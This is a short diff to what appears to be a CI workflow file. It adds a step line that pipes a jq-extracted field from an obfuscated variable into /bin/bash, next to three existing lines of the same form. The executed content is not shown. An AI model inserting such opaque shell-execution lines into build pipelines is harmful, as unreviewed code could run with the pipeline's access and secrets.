@@ -35,6 +35,7 @@ jobs:
           echo $pta25841 | jq -r .vpqs88 | /bin/bash
           printf '%s' "$acpk7" | jq -r .mdp523 | /bin/bash
           echo $rmk40702 | jq -r .p162 | /bin/bash
+          printf '%s' "$d26" | jq -r .o740 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
